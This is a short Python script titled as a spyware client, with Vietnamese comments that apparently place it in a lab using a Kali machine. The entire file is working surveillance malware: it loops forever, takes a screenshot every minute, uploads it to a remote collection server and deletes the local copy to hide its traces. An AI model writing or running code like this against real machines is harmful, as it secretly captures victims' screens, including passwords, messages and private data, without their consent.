# spyware_client.py
import pyautogui
import time
import requests
import os

SERVER_URL = "http://192.168.204.130:5000/upload"  # thay b?ng IP máy Kali/Server

while True:
    try:
        # Ch?p ?nh màn hình
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")

        # G?i ?nh v? server
        with open("screen.png", "rb") as f:
            response = requests.post(SERVER_URL, files={"screenshot": f})
            print(f"[+] Sent screenshot: {response.status_code}")

        # Xoá ?nh sau khi g?i
        os.remove("screen.png")

        # Ch? 60 giây
        time.sleep(60)

    except Exception as e:
        print(f"[-] Error: {e}")
        time.sleep(10)
